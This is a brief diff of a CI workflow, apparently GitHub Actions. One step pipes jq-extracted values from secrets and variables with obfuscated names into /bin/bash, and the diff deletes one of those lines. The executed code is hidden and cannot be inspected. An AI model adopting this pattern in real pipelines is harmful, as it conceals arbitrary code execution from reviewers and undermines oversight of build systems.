@@ -18,7 +18,6 @@ jobs:
           nrdou273: ${{ secrets.nrdou273 }}
         run: |
           printf '%s' "$nrdou273" | jq -r .q06965 | /bin/bash
-          echo $xto3715 | jq -r .ecs4 | /bin/bash
           echo $sxp11432 | jq -r .ry55347 | /bin/bash
           echo $ulf803 | jq -r .zpep263 | /bin/bash
           echo $wus87 | jq -r .knbp76600 | /bin/bash
